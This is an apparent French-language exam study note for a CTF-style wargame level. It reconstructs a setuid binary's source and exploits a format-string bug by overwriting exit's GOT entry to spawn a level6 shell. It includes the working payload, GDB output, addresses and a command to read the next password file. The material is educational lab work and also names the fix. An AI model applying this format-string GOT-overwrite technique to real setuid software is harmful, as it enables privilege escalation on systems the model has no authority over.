# Level5 - Exam Notes

## 1. Objective
Obtenir un shell level6. Le binaire est setuid level6 ; la fonction `o()` exécute `system("/bin/sh")` mais n’est jamais appelée. Après `printf(buffer)`, le programme appelle `exit(1)`.

## 2. Copy the binary (extraction)
Depuis l’hôte, dans le dossier du level :
```bash
sshpass -p '<level5_password>' scp -o StrictHostKeyChecking=no -P 4242 level5@localhost:level5 ./level5.bin
```
Ou depuis la VM : `scp -P 4242 level5@localhost:level5 ./level5.bin` (depuis l’hôte, en se connectant au bon host).

Référence : `commands.md`, section Recon / Extraction. Le binaire local permet l’analyse avec GDB et objdump sans être sur la VM.

**Recon (binaire local) :**
```bash
objdump -d level5
objdump -R level5
strings level5
```

## 3. Binary-to-source translation (source reconstruction)
- **Objdump / readelf :** `objdump -d level5.bin`, `readelf -s level5.bin` pour repérer `main`, `n`, `o`, les appels à `printf`, `exit`, et les adresses en .plt/.got.
- **Logique reconstituée :** `main` appelle `n()`. Dans `n()` : buffer 512 octets, `fgets(buf, 512, stdin)`, puis **printf(buf)** (pas de format fixe), puis **exit(1)**. La fonction **o()** fait `system("/bin/sh")` et n’est jamais appelée.
- **Où ça peut casser :** l’entrée utilisateur est passée comme **premier argument** à `printf` → chaîne de format contrôlée (format string). On peut utiliser `%n` pour écrire en mémoire. La cible logique : faire en sorte que l’appel à `exit(1)` ne parte pas vers la vraie exit mais vers **o()**.
- Source reconstruite : `source.c` (voir aussi `source.md`).

## 4. Understanding where it can break (vulnerability hypothesis)
- **Fonctions suspectes :** `printf(buffer)` dans `n()` → format string. Juste après : `exit(1)`.
- **Succès :** exécuter `o()` au lieu de `exit`. Pour cela, au lieu d’écraser une variable globale, on peut **écraser l’entrée GOT de exit** : au moment du `call exit@plt`, le CPU lira l’adresse dans la GOT ; si on y met l’adresse de **o**, le programme saute vers `o()` → `system("/bin/sh")`.
- **Hypothèse :** format string pour écrire l’adresse de `o` à l’adresse de la GOT de exit. Il faudra : (1) l’adresse de la GOT exit, (2) l’adresse de `o`, (3) l’**index** du buffer sur la stack (pour utiliser `%k$n` où le kᵉ argument est notre buffer contenant l’adresse GOT).

## 5. GDB diagnosis step-by-step

1. **Lancer GDB et charger le binaire**  
   ```bash
   gdb -q ./level5.bin
   ```

2. **Repérer les fonctions et la cible**  
   ```gdb
   info functions
   ```  
   Noter `n`, `o`, `exit`. Puis :  
   ```gdb
   disas n
   ```  
   Exemple de sortie (ce que ça prouve : buffer 0x218, fgets puis printf(buffer) puis exit) :
   ```
   Dump of assembler code for function n:
      0x080484c2 <+0>:     push   %ebp
      0x080484c3 <+1>:     mov    %esp,%ebp
      0x080484c5 <+3>:     sub    $0x218,%esp
      0x080484cb <+9>:     mov    0x8049848,%eax
      0x080484d0 <+14>:    mov    %eax,0x8(%esp)
      0x080484dc <+26>:    lea    -0x208(%ebp),%eax
      0x080484e2 <+32>:    mov    %eax,(%esp)
      0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
      0x080484ea <+40>:    lea    -0x208(%ebp),%eax
      0x080484f0 <+46>:    mov    %eax,(%esp)
      0x080484f3 <+49>:    call   0x8048380 <printf@plt>
      0x080484f8 <+54>:    movl   $0x1,(%esp)
      0x080484ff <+61>:    call   0x80483d0 <exit@plt>
   ```
   Repérer l’appel à `printf` et l’appel à `exit`. L’entrée GOT de exit est utilisée à cette adresse.

   **Relocations (GOT/PLT) :**
   ```bash
   readelf -r level5
   ```
   Exemple de sortie (ce qu’on en tire : exit → 0x8049838, system → 0x8049830) :
   ```
   Relocation section '.rel.plt' at offset 0x2fc contains 7 entries:
    Offset     Info    Type            Sym.Value  Sym. Name
   08049824  00000107 R_386_JUMP_SLOT   printf
   08049828  00000207 R_386_JUMP_SLOT   _exit
   0804982c  00000307 R_386_JUMP_SLOT   fgets
   08049830  00000407 R_386_JUMP_SLOT   system
   08049834  00000507 R_386_JUMP_SLOT   __gmon_start__
   08049838  00000607 R_386_JUMP_SLOT   exit
   0804983c  00000707 R_386_JUMP_SLOT   __libc_start_main
   ```
   → **GOT exit = 0x8049838**.

   **Vérifier la GOT avant exploit :**
   ```gdb
   x/x 0x8049838
   ```
   → `0x8049838 <exit@got.plt>: 0x080483d6` (résolution PLT normale).

3. **Breakpoint après printf, avant exit**  
   ```gdb
   break *<adresse_après_printf_dans_n>
   ```  
   Ou : `break n` puis avancer jusqu’après le call printf. But : inspecter la stack (pour le dump des arguments) et la GOT après notre payload.

4. **Premier run : trouver l’index du buffer (dump)**  
   Préparer un payload : les 4 premiers octets = "AAAA" (0x41414141), puis des format pour afficher les arguments.  
   ```bash
   python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p"' > /tmp/p
   ```  
   Dans GDB :  
   ```gdb
   run < /tmp/p
   ```  
   Exemple de sortie : `AAAA0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x70243125`  
   → **0x41414141** apparaît au 4ᵉ format : le 4ᵉ argument de printf pointe vers notre buffer. On utilisera **%4$n** pour écrire à l’adresse contenue dans le buffer.

   **Rappel format string :**  
   - `%k$p` = « afficher le kᵉ argument comme pointeur » (lecture).  
   - `%k$n` = « écrire le nombre d’octets déjà imprimés à l’adresse contenue dans le kᵉ argument » (écriture).  
   On met **AAAA** (0x41×4) en début de buffer pour reconnaître facilement notre buffer dans le dump.

   **Vérifier la stack :** `x/20x $esp` après le breakpoint pour voir les arguments passés à printf.

   **Flux de l’exploit :** (1) on envoie le payload ; (2) printf l’exécute ; (3) le payload modifie la mémoire (GOT) ; (4) breakpoint → vérifier le résultat (`x/wx 0x8049838`) ; (5) exit → déclenche l’exploit (call vers o).

5. **Adresses pour l’exploit**  
   - GOT exit : **0x8049838** (readelf -r ou désassemblage).  
   - Fonction o :  
     ```gdb
     p o
     ```  
     Exemple : `$1 = {<text variable, no debug info>} 0x80484a4 <o>` → **0x080484a4**.  
   - Pour écrire 0x080484a4 avec un seul `%n`, il faut que le nombre d’octets déjà imprimés soit 0x080484a4 = 134513828. Les 4 premiers octets du buffer seront l’adresse GOT (4 octets) → il faut imprimer encore **134513828 - 4 = 134513824** caractères, puis `%4$n`.

6. **Vérification en mémoire après exploit**  
   Construire le vrai payload : 4 octets = 0x8049838 (LE) + "%134513824x" + "%4$n".  
   ```gdb
   run < /tmp/exploit
   ```  
   À la breakpoint (ou après printf si on break après) :  
   ```gdb
   x/wx 0x8049838
   ```  
   Doit afficher **0x080484a4** (adresse de o). Puis continuer : au `call exit`, le programme saute vers o() → cela prouve le hijack GOT.

## 6. Exploit design and command explanation

**Conception :** On ne peut pas “retourner” depuis n() car après printf il y a exit(1). En modifiant **l’entrée GOT de exit**, le prochain appel à exit résout la cible vers **o()** au lieu de la libc. C’est un **GOT hijack**.

**Génération de la commande (converter.py) :**  
Le script `level5/converter.py` calcule à partir des adresses (GOT exit, o) le padding et produit la commande finale. Il utilise `p32(exit_got)` pour l'adresse en little-endian et `padding = o_addr - 4` pour le `%nx` avant `%4$n`. Sortie typique :  
`( python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat ) | ./level5`

**Commande finale (voir `commands.md`, section Exploitation) :**
```bash
( python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat ) | ./level5
```

**Décomposition :**

- **Invocation :** `( python -c '...'; cat ) | ./level5`  
  Le programme lit sur stdin. Le `cat` garde stdin ouvert après le payload pour qu’on puisse taper dans le shell.

- **Partie 1 — 4 octets : adresse GOT exit (cible du %n)**  
  - Adresse : **0x8049838**.  
  - Little-endian : octet de poids faible en premier → 38, 98, 04, 08.  
  - En Python : `\x38\x98\x04\x08`.  
  - Rôle : ces 4 octets sont au début du buffer ; le 4ᵉ argument de printf pointe vers ce buffer, donc **%4$n** écrit le nombre d’octets imprimés **à l’adresse 0x8049838** (GOT exit).

- **Partie 2 — "%134513824x"**  
  - Affiche 134513824 caractères (espaces + nombre en hex).  
  - Total imprimé avant %4$n = 4 + 134513824 = **134513828** = 0x080484a4.  
  - Donc %4$n écrit **0x080484a4** (adresse de o) dans la GOT.

- **Partie 3 — "%4$n"**  
  - Écrit le nombre d’octets déjà imprimés (134513828) à l’adresse contenue dans le 4ᵉ argument → 0x8049838.  
  - L’index 4 vient du dump GDB (AAAA + %k$p → 0x41414141 pour k=4).

Résumé : **\x38\x98\x04\x08** = GOT exit en LE ; **%134513824x** = padding pour que le total soit 0x080484a4 ; **%4$n** = écriture à la GOT. Au prochain `call exit`, le programme exécute o() → shell.

## 7. Reproducible procedure (for evaluation)
- **Commande :** `( python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat ) | ./level5` puis `cat /home/user/level6/.pass`.
- **Résultat attendu :** après quelques secondes (sortie volumineuse), un shell level6. Taper la commande pour afficher le mot de passe.
- **À dire :** « Format string dans n(). J’écrase la GOT de exit avec l’adresse de o(). L’index du buffer est 4 (trouvé avec AAAA + %k$p). Au lieu d’appeler exit, le programme appelle o() qui lance /bin/sh. »

## 8. Oral defense points
- **Bug :** printf(buffer) dans n(), avant exit(1). L’entrée est la chaîne de format.
- **GDB :** adresse de o 0x080484a4, GOT exit 0x8049838, index buffer 4 ; après exploit, GOT = 0x080484a4.
- **Payload :** GOT hijack (pas d’écriture de variable) : on détourne l’appel exit vers o().
- **Fix :** printf("%s", buffer) ; compilation avec RELRO pour protéger la GOT.

## 9. Common evaluator questions
- **Pourquoi la GOT de exit ?** Juste après printf le programme appelle exit(1) ; en modifiant cette entrée on redirige vers o().
- **Que fait %4$n ?** Il écrit le nombre d’octets imprimés à l’adresse contenue dans le 4ᵉ argument (notre buffer avec 0x8049838).
- **Pourquoi 134513824 ?** 0x080484a4 = 134513828 ; on a déjà imprimé 4 octets (l’adresse), donc 134513828 - 4.
- **Little-endian de 0x8049838 ?** 38 98 04 08 → \x38\x98\x04\x08 (octet de poids faible en premier).
